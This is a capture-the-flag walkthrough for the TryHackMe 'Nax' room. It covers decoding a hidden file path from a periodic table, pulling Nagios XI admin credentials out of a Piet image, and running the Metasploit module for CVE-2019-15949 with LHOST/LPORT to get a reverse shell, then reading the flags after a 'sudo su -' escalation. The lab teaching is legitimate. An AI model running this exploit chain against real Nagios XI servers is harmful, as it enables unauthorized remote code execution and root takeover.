# [Nax](https://tryhackme.com/room/nax)

## Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.

# Flag

### What hidden file did you find?

1. Begin with network reconnaissance to identify open services

```bash
nmap IP
```

[SCREEN01]

2. Navigate to `https://<TARGET_IP>` to examine the web application. The page displays a periodic table. Extract the atomic numbers and decode using [CyberChef](https://gchq.github.io/CyberChef/). "From Decimal" operation reveals the hidden file path: `/PI3T.PNg`

```
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
47 - 80 - 73 - 51 - 84 - 46 - 80 - 78 - 103
47 80 73 51 84 46 80 78 103
```

[SCREEN03]

---

### Who is the creator of the file?

1. Access the discovered file at `https://<TARGET_IP>/PI3T.PNg` and download it for analysis

2. Analyze the file using strings to extract embedded metadata.

```bash
strings PI3T.PNg
```

[SCREEN04]

---

### What is the username you found?

### What is the password you found?

_% is a separator_

1. The PNG file contains a Piet program (esoteric programming language using colors as code). Use an [online Piet interpreter](https://www.bertnase.de/npiet/npiet-execute.php) to execute the hidden program within the image.

   - The Piet program outputs credentials are `nagiosadmin:n3p3UQ&9BjLp4$7uhWdY`

[SCREEN05]

### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

1. Log into the Nagios XI interface at `http://<TARGET_IP>/nagiosxi/index.php` using the discovered credentials. The system reports version is `5.5.6`. The relevant CVE can be found at: `https://www.cve.org/CVERecord?id=CVE-2019-15949`

---

### After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?

1. search for our target exploit using the command 'search nagios'.

   - The module is: `exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`

```bash
msfconsole
search nagios
```

[SCREEN06]

---

### Compromise the machine and locate user.txt

1. Configure module, and execute it to get user flag

```bash
use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
show options
set RHOSTS <TARGET_IP>
set USERNAME nagiosadmin
set PASSWORD n3p3UQ&9BjLp4$7uhWdY
set LHOST <YOUR_IP>
set LPORT 4444
exploit

shell

ls /home
ls /home/galand
cat /home/galand/user.txt
```

[SCREEN07]

---

### Locate root.txt

1. Escalate privileges to root user

```bash
sudo -l
sudo su -
whoami
cat /root/root.txt
```

[SCREEN08]
